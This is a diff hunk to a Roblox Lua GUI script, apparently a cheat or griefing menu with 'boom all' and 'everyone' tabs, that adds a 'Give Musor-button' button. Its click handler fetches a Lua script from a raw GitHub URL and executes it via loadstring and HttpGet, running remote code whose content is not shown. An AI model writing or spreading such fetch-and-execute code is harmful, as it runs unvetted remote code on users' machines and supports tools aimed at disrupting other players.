@@ -486,6 +486,22 @@ boomAllBtn.MouseButton1Click:Connect(function()
     end
 end)
 
+-- ==================== GIVE MUSOR-BUTTON (EVERYONE) ====================
+local musorBtn = Instance.new("TextButton")
+musorBtn.Size = UDim2.new(1, 0, 0, 32)
+musorBtn.Text = "Give Musor-button"
+musorBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+musorBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
+musorBtn.Font = Enum.Font.SourceSansBold
+musorBtn.TextSize = 13
+musorBtn.BorderSizePixel = 0
+musorBtn.Parent = everyoneTab
+Instance.new("UICorner", musorBtn).CornerRadius = UDim.new(0, 4)
+
+musorBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/monyhh057-dotcom/noa/main/ss.lua"))()
+end)
+
 -- ==================== УПРАВЛЕНИЕ ОКНОМ ====================
 local isMinimized = false
 MinimizeButton.MouseButton1Click:Connect(function()
